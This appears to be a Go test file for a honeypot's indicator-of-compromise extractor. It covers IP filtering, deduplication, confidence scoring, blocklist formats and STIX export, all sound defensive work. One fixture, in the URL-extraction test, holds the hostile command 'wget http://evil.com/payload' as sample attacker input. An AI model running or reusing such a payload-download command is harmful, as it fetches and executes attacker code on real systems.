/*
©AngelaMos | 2026
ioc_test.go
*/

package intel

import (
	"encoding/json"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/CarterPerez-dev/hive/pkg/types"
)

func TestExtractPublicIP(t *testing.T) {
	ext := NewExtractor()
	ev := &types.Event{
		SourceIP:    "203.0.113.1",
		EventType:   types.EventConnect,
		ServiceType: types.ServiceSSH,
		Timestamp:   time.Now().UTC(),
	}

	iocs := ext.Extract(ev)
	require.Len(t, iocs, 1)
	assert.Equal(t, types.IOCIPv4, iocs[0].Type)
	assert.Equal(t, "203.0.113.1", iocs[0].Value)
}

func TestExtractSkipsPrivateAndLoopback(t *testing.T) {
	ext := NewExtractor()

	tests := []struct {
		name string
		ip   string
	}{
		{"private class A", "10.0.0.1"},
		{"private class C", "192.168.1.1"},
		{"loopback", "127.0.0.1"},
		{"private class B", "172.16.0.1"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ev := &types.Event{
				SourceIP:    tt.ip,
				EventType:   types.EventConnect,
				ServiceType: types.ServiceSSH,
				Timestamp:   time.Now().UTC(),
			}
			iocs := ext.Extract(ev)
			assert.Empty(t, iocs)
		})
	}
}

func TestExtractURLsAndDomains(t *testing.T) {
	ext := NewExtractor()
	ev := &types.Event{
		SourceIP:    "10.0.0.1",
		EventType:   types.EventCommand,
		ServiceType: types.ServiceSSH,
		Timestamp:   time.Now().UTC(),
		ServiceData: json.RawMessage(
			`{"command":"wget http://evil.com/payload"}`,
		),
	}

	iocs := ext.Extract(ev)

	var urls, domains []string
	for _, ioc := range iocs {
		switch ioc.Type {
		case types.IOCURL:
			urls = append(urls, ioc.Value)
		case types.IOCDomain:
			domains = append(domains, ioc.Value)
		default:
		}
	}

	assert.Contains(t, urls, "http://evil.com/payload")
	assert.Contains(t, domains, "evil.com")
}

func TestExtractBulkDeduplication(t *testing.T) {
	now := time.Now().UTC()
	events := []*types.Event{
		{
			SourceIP:    "203.0.113.1",
			EventType:   types.EventConnect,
			ServiceType: types.ServiceSSH,
			Timestamp:   now,
		},
		{
			SourceIP:    "203.0.113.1",
			EventType:   types.EventCommand,
			ServiceType: types.ServiceSSH,
			Timestamp:   now.Add(time.Minute),
		},
	}

	iocs := ExtractBulk(events)

	var ipCount int
	for _, ioc := range iocs {
		if ioc.Type == types.IOCIPv4 &&
			ioc.Value == "203.0.113.1" {
			ipCount++
			assert.Equal(t, 2, ioc.SightCount)
		}
	}
	assert.Equal(t, 1, ipCount)
}

func TestConfidenceByEventType(t *testing.T) {
	ext := NewExtractor()

	tests := []struct {
		name      string
		eventType types.EventType
		want      int
	}{
		{"exploit", types.EventExploit, 95},
		{"command", types.EventCommand, 85},
		{"login success", types.EventLoginSuccess, 80},
		{"login failed", types.EventLoginFailed, 80},
		{"scan", types.EventScan, 70},
		{"connect", types.EventConnect, 50},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ev := &types.Event{
				SourceIP:    "203.0.113.1",
				EventType:   tt.eventType,
				ServiceType: types.ServiceSSH,
				Timestamp:   time.Now().UTC(),
			}
			iocs := ext.Extract(ev)
			require.NotEmpty(t, iocs)
			assert.Equal(t, tt.want, iocs[0].Confidence)
		})
	}
}

func TestFilterIPs(t *testing.T) {
	iocs := []*types.IOC{
		{Type: types.IOCIPv4, Value: "1.2.3.4"},
		{Type: types.IOCURL, Value: "http://evil.com"},
		{Type: types.IOCIPv6, Value: "2001:db8::1"},
		{Type: types.IOCDomain, Value: "evil.com"},
	}

	filtered := FilterIPs(iocs)
	assert.Len(t, filtered, 2)
}

func TestFilterByMinConfidence(t *testing.T) {
	iocs := []*types.IOC{
		{
			Type: types.IOCIPv4, Value: "1.2.3.4",
			Confidence: 90,
		},
		{
			Type: types.IOCIPv4, Value: "5.6.7.8",
			Confidence: 50,
		},
		{
			Type: types.IOCIPv4, Value: "9.10.11.12",
			Confidence: 80,
		},
	}

	filtered := FilterByMinConfidence(iocs, 80)
	assert.Len(t, filtered, 2)
}

func TestGenerateBlocklistFormats(t *testing.T) {
	now := time.Now().UTC()
	iocs := []*types.IOC{
		{
			Type: types.IOCIPv4, Value: "1.2.3.4",
			FirstSeen: now, LastSeen: now,
			SightCount: 1, Confidence: 90,
			Source: "honeypot:ssh",
			Tags:   []string{"service:ssh"},
		},
		{
			Type: types.IOCIPv4, Value: "5.6.7.8",
			FirstSeen: now, LastSeen: now,
			SightCount: 2, Confidence: 85,
			Source: "honeypot:http",
			Tags:   []string{"service:http"},
		},
	}

	tests := []struct {
		name     string
		format   string
		contains string
	}{
		{"plain", FormatPlain, "1.2.3.4\n"},
		{
			"iptables", FormatIPTables,
			"iptables -A INPUT -s 1.2.3.4 -j DROP",
		},
		{"nginx", FormatNginx, "deny 1.2.3.4;"},
		{"csv header", FormatCSV, "ip,type,first_seen"},
		{"csv row", FormatCSV, "1.2.3.4,ipv4"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := GenerateBlocklist(iocs, tt.format)
			assert.Contains(t, result, tt.contains)
		})
	}
}

func TestGenerateSTIXBundleStructure(t *testing.T) {
	now := time.Now().UTC()
	iocs := []*types.IOC{
		{
			Type: types.IOCIPv4, Value: "1.2.3.4",
			FirstSeen: now, LastSeen: now,
			SightCount: 1, Confidence: 90,
			Source: "honeypot:ssh",
			Tags:   []string{"service:ssh"},
		},
	}

	data, err := GenerateSTIXBundle(iocs)
	require.NoError(t, err)

	var bundle map[string]interface{}
	require.NoError(t, json.Unmarshal(data, &bundle))

	assert.Equal(t, "bundle", bundle["type"])

	objects, ok := bundle["objects"].([]interface{})
	require.True(t, ok)
	require.GreaterOrEqual(t, len(objects), 2)

	identity, ok := objects[0].(map[string]interface{})
	require.True(t, ok)
	assert.Equal(t, "identity", identity["type"])
	assert.Equal(t,
		"Hive Honeypot Network", identity["name"],
	)
	assert.Equal(t, "2.1", identity["spec_version"])

	indicator, ok := objects[1].(map[string]interface{})
	require.True(t, ok)
	assert.Equal(t, "indicator", indicator["type"])
	assert.Equal(t, "stix", indicator["pattern_type"])
	assert.Contains(t, indicator["pattern"], "1.2.3.4")
}

func TestHasTag(t *testing.T) {
	ioc := &types.IOC{
		Tags: []string{"service:ssh", "exploit-attempt"},
	}

	assert.True(t, HasTag(ioc, "service:ssh"))
	assert.True(t, HasTag(ioc, "SERVICE:SSH"))
	assert.True(t, HasTag(ioc, "exploit-attempt"))
	assert.False(t, HasTag(ioc, "nonexistent"))
}
